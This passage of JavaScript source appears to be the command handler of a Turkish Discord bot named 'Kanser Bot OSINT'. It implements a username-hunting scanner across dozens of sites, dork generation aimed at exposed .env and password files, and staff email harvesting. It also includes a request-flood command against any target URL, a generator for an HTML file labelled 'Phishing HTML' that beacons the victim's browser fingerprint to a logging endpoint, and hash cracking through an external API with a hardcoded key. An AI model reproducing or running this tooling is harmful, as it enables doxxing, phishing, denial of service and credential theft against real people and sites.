              { name: 'HackerNews', url: `https://news.ycombinator.com/user?id=${username}` },
              { name: 'TryHackMe', url: `https://tryhackme.com/p/${username}` },
              { name: 'HackTheBox', url: `https://app.hackthebox.com/users/${username}` },
              { name: 'YouTube', url: `https://www.youtube.com/@${username}` },
              { name: 'Kaggle', url: `https://www.kaggle.com/${username}` },
              { name: 'Pastebin', url: `https://pastebin.com/u/${username}` },
              { name: 'Wattpad', url: `https://www.wattpad.com/user/${username}` },
              { name: 'Codecademy', url: `https://www.codecademy.com/profiles/${username}` },
              { name: 'Blogger', url: `https://${username}.blogspot.com` },
              { name: 'Tumblr', url: `https://${username}.tumblr.com` },
              { name: 'TripAdvisor', url: `https://www.tripadvisor.com/Profile/${username}` },
              { name: 'Behance', url: `https://www.behance.net/${username}` },
              { name: 'Dribbble', url: `https://dribbble.com/${username}` },
              { name: 'Keybase', url: `https://keybase.io/${username}` },
              { name: 'CodePen', url: `https://codepen.io/${username}` },
              { name: 'About.me', url: `https://about.me/${username}` },
              { name: 'Goodreads', url: `https://www.goodreads.com/${username}` },
              { name: 'Gravatar', url: `https://en.gravatar.com/${username}` },
              { name: 'Last.fm', url: `https://www.last.fm/user/${username}` },
              { name: 'DailyMotion', url: `https://www.dailymotion.com/${username}` },
              { name: 'Fiverr', url: `https://www.fiverr.com/${username}` },
              { name: 'Upwork', url: `https://www.upwork.com/freelancers/~${username}` },
              { name: 'Freelancer', url: `https://www.freelancer.com/u/${username}` },
              { name: 'BitBucket', url: `https://bitbucket.org/${username}/` },
              { name: 'Gitea', url: `https://gitea.com/${username}` },
              { name: 'Bandcamp', url: `https://bandcamp.com/${username}` },
              { name: 'ReverbNation', url: `https://www.reverbnation.com/${username}` },
              { name: 'MyAnimeList', url: `https://myanimelist.net/profile/${username}` },
              { name: 'Letterboxd', url: `https://letterboxd.com/${username}/` },
              { name: 'Xbox Gamertag', url: `https://account.xbox.com/en-us/profile?gamertag=${username}` },
              { name: 'PSNProfiles', url: `https://psnprofiles.com/${username}` },
              { name: 'Chess.com', url: `https://www.chess.com/member/${username}` },
              { name: 'Lichess', url: `https://lichess.org/@/${username}` },
              { name: 'Linktree', url: `https://linktr.ee/${username}` }
            ];

            // Her platform icin 5sn timeout ekle, hizli tarama
            const results = await Promise.allSettled(platforms.map(async p => {
              try {
                const c = new AbortController();
                const id = setTimeout(() => c.abort(), 5000);
                const r = await fetch(p.url, {
                  method: 'GET',
                  headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' },
                  signal: c.signal
                });
                clearTimeout(id);
                return { name: p.name, url: p.url, exists: r.status === 200 };
              } catch (e) {
                return { name: p.name, url: p.url, exists: false };
              }
            }));

            const found = results.filter(r => r.status === 'fulfilled' && r.value.exists).map(r => r.value);

            // .txt dosyasi olarak hazirla
            let textOutput = `KULLANICI AVI RAPORU - ${username}\n`;
            textOutput += `Tarih: ${new Date().toISOString()}\n`;
            textOutput += `Taranan Platform: ${platforms.length}\n`;
            textOutput += `Bulunan Eslesme: ${found.length}\n`;
            textOutput += `${'='.repeat(50)}\n\n`;

            if (found.length === 0) {
              textOutput += 'Hicbir platformda profil bulunamadi.\n';
            } else {
              textOutput += 'BULUNAN PROFILLER:\n\n';
              found.forEach((f, i) => {
                textOutput += `${String(i + 1).padStart(2, '0')}. ${f.name}\n`;
                textOutput += `   Link: ${f.url}\n\n`;
              });
            }

            textOutput += `\n${'='.repeat(50)}\n`;
            textOutput += `Rapor sonu. Kanser Bot OSINT\n`;

            // .txt dosyasi olarak gonder
            const formData = new FormData();
            formData.append('files[0]', new Blob([textOutput], { type: 'text/plain;charset=UTF-8' }), `kimlik-${username}.txt`);
            formData.append('payload_json', JSON.stringify({
              content: `✅ Kullanici Avi Tamamlandi: ${username} — ${found.length}/${platforms.length} platformda profil bulundu.\n📄 Detaylar dosyaya kaydedildi.`
            }));
            await updateInteraction(interaction.application_id, interaction.token, formData, true);
          } catch (err) {
            try {
              const hataMetin = `KULLANICI AVI HATASI - ${getOption('kullanici') || 'Bilinmiyor'}\nTarih: ${new Date().toISOString()}\nHata: ${err.message}\nStack: ${err.stack || 'Yok'}`;
              const hataFormData = new FormData();
              hataFormData.append('files[0]', new Blob([hataMetin], { type: 'text/plain;charset=UTF-8' }), `hata-${Date.now()}.txt`);
              hataFormData.append('payload_json', JSON.stringify({ content: `❌ Hata olustu, detaylar dosyada.` }));
              await updateInteraction(interaction.application_id, interaction.token, hataFormData, true);
            } catch (e2) {
              await updateInteraction(interaction.application_id, interaction.token, { content: `Avci hatasi: ${err.message}` });
            }
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'dork-uret':
        ctx.waitUntil((async () => {
          try {
            const domain = getOption('domain');
            const tur = getOption('tur');
            const dorks = [
              `site:${domain} filetype:${tur}`,
              `site:${domain} intitle:"index of" ${tur}`,
              `site:${domain} inurl:${tur} ext:txt OR ext:log OR ext:env`,
              `site:${domain} intext:"password" filetype:${tur}`,
              `site:${domain} inurl:admin | inurl:login filetype:${tur}`
            ];
            const links = dorks.map(d => `Dork: \`${d}\`\nLink: https://www.google.com/search?q=${encodeURIComponent(d)}`).join('\n\n');
            await updateInteraction(interaction.application_id, interaction.token, { content: `Uretilen Dork Sorgulari:\n\n${links}` });
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `Dork hatasi: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'domain-istihbarat':
        ctx.waitUntil((async () => {
          try {
            const domain = getOption('domain');
            const res = await fetch(`https://rdap.org/domain/${domain}`);
            if (!res.ok) throw new Error("RDAP API kayitlari bulamadi.");
            const data = await res.json();
            const handle = data.handle || 'Yok';
            const events = data.events || [];
            const created = events.find(e => e.eventAction === 'registration')?.eventDate || 'Bilinmiyor';
            const entities = data.entities || [];
            const registrar = entities.find(e => e.roles?.includes('registrar'))?.vcardArray?.[1]?.find(v => v[0] === 'fn')?.[3] || 'Bilinmiyor';

            await updateInteraction(interaction.application_id, interaction.token, { content: `Istihbarat Sonucu (${domain}):\nTescil Tarihi: ${created}\nRegistrar: ${registrar}\nHandle: ${handle}` });
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `Istihbarat hatasi: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'personel-bul':
        try {
          const domain = getOption('domain');
          if (!env.HUNTER_API_KEY) return sendResponse('HUNTER_API_KEY sistemde tanimli olmadigi icin personel taramasi yapilamiyor.');
          const res = await fetch(`https://api.hunter.io/v2/domain-search?domain=${domain}&api_key=${env.HUNTER_API_KEY}`);
          if (!res.ok) throw new Error();
          const data = await res.json();
          const emails = data.data.emails.map(e => e.value).slice(0, 10).join('\n');
          if (!emails) return sendResponse('Kayitli e-posta bulunamadi.');
          return sendResponse(`Bulunan Personel E-postalari (${domain}):\n${emails}`);
        } catch { return sendResponse('Personel arama hatasi veya yetkisiz erisim.'); }

      case 'id-sorgula':
        ctx.waitUntil((async () => {
          try {
            const id = getOption('id');

            // Snowflake analizi
            const discordEpoch = 1420070400000n;
            const snowflake = BigInt(id);
            const timestamp = (snowflake >> 22n) + discordEpoch;
            const date = new Date(Number(timestamp));
            const yas = Math.floor((Date.now() - Number(timestamp)) / (365.25 * 24 * 60 * 60 * 1000));

            let result = `ID \`${id}\` icin kapsamli analiz:\n\n`;
            result += `**Hesap Olusturulma:** ${date.toUTCString()} (${yas} yil once)\n\n`;

            // Discord API'den profil bilgisi cek
            const userRes = await fetch(`https://discord.com/api/v10/users/${id}`, {
              headers: { 'Authorization': `Bot ${env.DISCORD_TOKEN}` }
            });

            let u;
            if (userRes.ok) {
              u = await userRes.json();

              result += `**Kullanici:** ${u.global_name || 'Ayarlanmamis'}\n`;
              result += `**Kullanici Adi:** ${u.username || 'Yok'}\n`;

              if (u.bot) {
                result += `**Tip:** Robot / Otomasyon\n`;
              } else {
                result += `**Tip:** Gercek Kullanici\n`;
              }

              // Avatar + Animasyon tespiti
              let avatarAnimasyon = '';
              if (u.avatar) {
                const ext = u.avatar.startsWith('a_') ? 'gif' : 'png';
                if (u.avatar.startsWith('a_')) avatarAnimasyon = ' (Animasyonlu - Nitro)';
                const avatarUrl = `https://cdn.discordapp.com/avatars/${id}/${u.avatar}.${ext}?size=256`;
                result += `**Avatar:** [Link](${avatarUrl})${avatarAnimasyon}\n`;
              } else {
                // Varsayilan avatar hesapla (son 4 ID hanesine gore)
                const defaultNum = parseInt(id.slice(-4)) % 6;
                const defaultAvatarUrl = `https://cdn.discordapp.com/embed/avatars/${defaultNum}.png`;
                result += `**Avatar:** Varsayilan (${defaultAvatarUrl})\n`;
              }

              // Banner
              if (u.banner) {
                const ext2 = u.banner.startsWith('a_') ? 'gif' : 'png';
                const bannerUrl = `https://cdn.discordapp.com/banners/${id}/${u.banner}.${ext2}?size=256`;
                result += `**Banner/Kapak:** [Link](${bannerUrl})\n`;
              }

              // Profil rengi
              if (u.accent_color) {
                result += `**Profil Rengi:** #${u.accent_color.toString(16).padStart(6, '0')}\n`;
              }

              // Nitro
              const premiumNames = { 0: 'Yok', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic' };
              result += `**Nitro:** ${premiumNames[u.premium_type] || 'Bilinmiyor'}\n`;

              // Rozetler
              if (u.public_flags) {
                const badges = [];
                if (u.public_flags & 1) badges.push('Discord Calisani');
                if (u.public_flags & 2) badges.push('Partner Sahibi');
                if (u.public_flags & 4) badges.push('HypeSquad Events');
                if (u.public_flags & 8) badges.push('Bug Hunter L1');
                if (u.public_flags & 64) badges.push('HypeSquad Bravery');
                if (u.public_flags & 128) badges.push('HypeSquad Brilliance');
                if (u.public_flags & 256) badges.push('HypeSquad Balance');
                if (u.public_flags & 512) badges.push('Early Supporter');
                if (u.public_flags & 16384) badges.push('Bug Hunter L2');
                if (u.public_flags & 131072) badges.push('Erken Bot Gelistirici');
                if (u.public_flags & 262144) badges.push('Sertifikali Mod');
                if (u.public_flags & 4194304) badges.push('Aktif Gelistirici');

                if (badges.length > 0) {
                  result += `\n**Rozetler:**\n${badges.map(b => '• ' + b).join('\n')}\n`;
                }
              }
            } else if (userRes.status === 404) {
              result += `\nBu hesap SILINMIS veya gecerli degil.\n`;
            } else {
              result += `\n(Discord API profil bilgisi alinamadi)\n`;
            }

            // Guild'a ozel avatar
            let guildAvatarStr = '';
            try {
              const memberRes = await fetch(`https://discord.com/api/v10/guilds/${interaction.guild_id}/members/${id}`, {
                headers: { 'Authorization': `Bot ${env.DISCORD_TOKEN}` }
              });
              if (memberRes.ok) {
                const m = await memberRes.json();
                const katilma = new Date(m.joined_at);
                const boost = m.premium_since ? 'Evet' : 'Hayir';
                const timeout = m.communication_disabled_until ? `\n**Kisitli:** ${m.communication_disabled_until}` : '';
                result += `\n**Sunucuda:** Evet\n**Katilma:** ${katilma.toUTCString()}\n**Boost:** ${boost}\n**Roller:** ${m.roles.length} adet${timeout}\n`;

                // Guild'a ozel avatar
                if (m.avatar) {
                  const gExt = m.avatar.startsWith('a_') ? 'gif' : 'png';
                  const gAvatarUrl = `https://cdn.discordapp.com/guilds/${interaction.guild_id}/users/${id}/avatars/${m.avatar}.${gExt}?size=128`;
                  guildAvatarStr = `**Sunucu Avatar:** [Link](${gAvatarUrl})\n`;
                }

                // Susturulmus / timeout kontrolu
                if (m.mute) result += `**Susturulmus:** Evet\n`;
                if (m.deaf) result += `**Sagir:** Evet\n`;
              }
            } catch (e) {}
            if (guildAvatarStr) result += '\n' + guildAvatarStr;

            // Bot list kontrolu (top.gg)
            if (u && u.bot) {
              try {
                const topggRes = await fetch(`https://top.gg/api/bots/${id}`, {
                  headers: { 'User-Agent': 'DiscordBot' }
                });
                if (topggRes.ok) {
                  const tg = await topggRes.json();
                  result += `\n**top.gg Bot Bilgisi:**\n`;
                  result += `**Isim:** ${tg.username || 'Yok'}\n`;
                  if (tg.shortdesc) result += `**Aciklama:** ${tg.shortdesc.slice(0, 100)}\n`;
                  if (tg.guilds) result += `**Sunucu Sayisi:** ${tg.guilds.toLocaleString()}\n`;
                  if (tg.points) result += `**Puan:** ${tg.points}\n`;
                  if (tg.invite) result += `**Davet:** [Link](${tg.invite})\n`;
                } else if (topggRes.status === 404) {
                  result += `\n**top.gg:** Kayitli degil\n`;
                }
              } catch (e) {}
            }

            // Hesap aktif/suspended kontrolu
            if (u && userRes.ok && u.bot === false) {
              try {
                // DM acmayi dene - suspended hesaplar DM alamaz
                const dmTest = await fetch('https://discord.com/api/v10/users/@me/channels', {
                  method: 'POST',
                  headers: { 'Authorization': `Bot ${env.DISCORD_TOKEN}`, 'Content-Type': 'application/json' },
                  body: JSON.stringify({ recipient_id: id })
                });
                if (dmTest.status === 403) {
                  result += `\n**Hesap Durumu:** Bu kullaniciya DM atilamiyor (Suspended/Deaktif olabilir)\n`;
                } else if (dmTest.ok) {
                  result += `\n**Hesap Durumu:** Aktif (DM acilabiliyor)\n`;
                }
              } catch (e) {}
            }

            await updateInteraction(interaction.application_id, interaction.token, { content: result });
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `ID sorgulama hatasi: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });
      case 'kara-liste':
        ctx.waitUntil((async () => {
          try {
            const hedef = getOption('hedef').trim();
            const isIp = /^\d{1,3}(\.\d{1,3}){3}$/.test(hedef);
            const blacklists = isIp ?
              ['zen.spamhaus.org', 'bl.spamcop.net', 'dnsbl.sorbs.net', 'b.barracudacentral.org'] :
              ['dbl.spamhaus.org', 'uribl.spameatingmonkey.net', 'multi.surbl.org'];
            const prefix = isIp ? hedef.split('.').reverse().join('.') : hedef;
            let result = `**Kara Liste Raporu:** \`${hedef}\`\n\n`;
            for (const bl of blacklists) {
              try {
                const r = await fetch(`https://cloudflare-dns.com/dns-query?name=${prefix}.${bl}&type=A`, { headers: { 'accept': 'application/dns-json' } });
                const data = await r.json();
                result += data.Answer ? `🔴 **${bl}**: KARA LISTEDE\n` : `✅ **${bl}**: Temiz\n`;
              } catch (e) { result += `⚠️ **${bl}**: Sorgulanamadi\n`; }
            }
            await updateInteraction(interaction.application_id, interaction.token, { content: result });
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `Kara liste hatasi: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'sunucu-dusur':
        ctx.waitUntil((async () => {
          try {
            const hedef = getOption('hedef');
            const sure = Math.min(Math.max(getOption('sure') || 5, 1), 10);
            const url = hedef.startsWith('http') ? hedef : `http://${hedef}`;
            const end = Date.now() + sure * 1000;
            let ok = 0, block = 0;
            while (Date.now() < end) {
              await Promise.allSettled(Array.from({ length: 10 }, () =>
                fetch(url, { method: 'GET', redirect: 'manual' }).then(r => r.status < 400 ? ok++ : block++).catch(() => block++)
              ));
            }
            await updateInteraction(interaction.application_id, interaction.token, { content: `**Stres Testi:** ${hedef}\nSure: ${sure}s\nBasarili: ${ok}\nEngellenen: ${block}` });
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `Stres test hatasi: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'pdf-zararli':
        ctx.waitUntil((async () => {
          try {
            const isim = (getOption('isim') || 'teknik-analiz').endsWith('.html') ? getOption('isim') : `${getOption('isim') || 'teknik-analiz'}.html`;
            const host = request.headers.get('host') || 'bot-domain.com';
            const creatorId = interaction.member?.user?.id;
            const logHedefi = getOption('log_hedefi') || 'log-kanali';
            const htmlId = Math.random().toString(36).substring(2, 10);
            await env.KV.put(`pdfcfg_${htmlId}`, JSON.stringify({ creatorId, logHedefi }), { expirationTtl: 86400 });
            const logUrl = `https://${host}/log-pdf?id=${htmlId}`;
            const htmlContent = `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Rapor</title></head><body><h1>Dokuman Cozumleniyor...</h1><script>fetch('${logUrl}',{method:'POST',body:JSON.stringify({url:location.href,ua:navigator.userAgent,platform:navigator.platform,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,screen:screen.width+'x'+screen.height})})</script></body></html>`;
            const formData = new FormData();
            formData.append('files[0]', new Blob([htmlContent], { type: 'text/html' }), isim);
            formData.append('payload_json', JSON.stringify({ content: `**Phishing HTML Hazir:** \`${isim}\`\nLog URL: ${logUrl}` }));
            await updateInteraction(interaction.application_id, interaction.token, formData, true);
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `HTML hatasi: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'alt-alan':
        ctx.waitUntil((async () => {
          try {
            const domain = getOption('domain');
            const res = await fetch(`https://crt.sh/?q=${domain}&output=json`);
            if (!res.ok) throw new Error('crt.sh servisine erisilemedi.');
            const data = await res.json();
            if (!data || data.length === 0) {
              await updateInteraction(interaction.application_id, interaction.token, { content: `${domain} icin alt alan bulunamadi.` });
              return;
            }
            const subs = [...new Set(data.map(d => d.name_value))].filter(s => s.includes(domain));
            let result = `**Alt Alan Kesfi:** ${domain}\nToplam: ${subs.length}\n\n${subs.slice(0, 15).join('\n')}`;
            await updateInteraction(interaction.application_id, interaction.token, { content: result });
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `Alt alan hatasi: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'gecmis-dns':
        ctx.waitUntil((async () => {
          try {
            const domain = getOption('domain');
            const res = await fetch(`https://api.hackertarget.com/hostsearch/?q=${domain}`);
            if (!res.ok) throw new Error('HackerTarget servisine erisilemedi.');
            const data = await res.text();
            if (data.includes('error')) {
              await updateInteraction(interaction.application_id, interaction.token, { content: 'Gecmis DNS verisi bulunamadi veya limit asildi.' });
              return;
            }
            await updateInteraction(interaction.application_id, interaction.token, { content: `**Gecmis DNS & WAF Atlatma:** ${domain}\n\n${data.split('\n').slice(0, 15).join('\n')}` });
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `DNS gecmis hatasi: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'exploit-ara':
        ctx.waitUntil((async () => {
          try {
            if (!env.GITHUB_TOKEN) throw new Error('GITHUB_TOKEN bulunamadi.');
            const cve = getOption('cve');
            const res = await fetch(`https://api.github.com/search/repositories?q=${cve}+exploit+OR+poc&sort=stars&order=desc`, {
              headers: { Authorization: `Bearer ${env.GITHUB_TOKEN}`, 'User-Agent': 'Kanser-Bot-OSINT' }
            });
            if (!res.ok) throw new Error('GitHub aramasi basarisiz.');
            const data = await res.json();
            let result = `**Exploit/PoC Ara:** ${cve}\nToplam: ${data.total_count}\n\n`;
            (data.items || []).slice(0, 3).forEach((r, i) => {
              result += `${i + 1}. ${r.full_name} ⭐${r.stargazers_count}\n   ${r.html_url}\n`;
            });
            await updateInteraction(interaction.application_id, interaction.token, { content: result });
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `Exploit arama hatasi: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'sifre-kir':
        ctx.waitUntil((async () => {
          try {
            const hash = getOption('hash').trim();
            const len = hash.length;
            const hashType = { 32: 'MD5/NTLM', 40: 'SHA1', 64: 'SHA256', 96: 'SHA384', 128: 'SHA512' }[len] || null;
            if (!hashType) {
              await updateInteraction(interaction.application_id, interaction.token, { content: `Desteklenmeyen hash: ${len} karakter. MD5/SHA1/SHA256/SHA384/SHA512 desteklenir.` });
              return;
            }
            const apiType = { 32: 'md5', 40: 'sha1', 64: 'sha256', 96: 'sha384', 128: 'sha512' }[len];
            const res = await fetch(`https://md5decrypt.net/Api/api.php?hash=${hash}&hash_type=${apiType}&email=hacker@gmail.com&code=1152464b80a61728`);
            const data = await res.text();
            if (data && data.trim()) {
              await updateInteraction(interaction.application_id, interaction.token, { content: `**Hash Kirildi!**\nHash: ${hash}\nTip: ${hashType}\nSonuc: \`${data.trim()}\`` });
            } else {
              await updateInteraction(interaction.application_id, interaction.token, { content: `Hash kirilamadi.\nHash: ${hash}\nTip: ${hashType}` });
            }
          } catch (err) {
            await updateInteraction(interaction.application_id, interaction.token, { content: `Sifre kirma hatasi: ${err.message}` });
          }
        })());
        return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    default:
      return null;
  }
}

export { handleKanserBot };
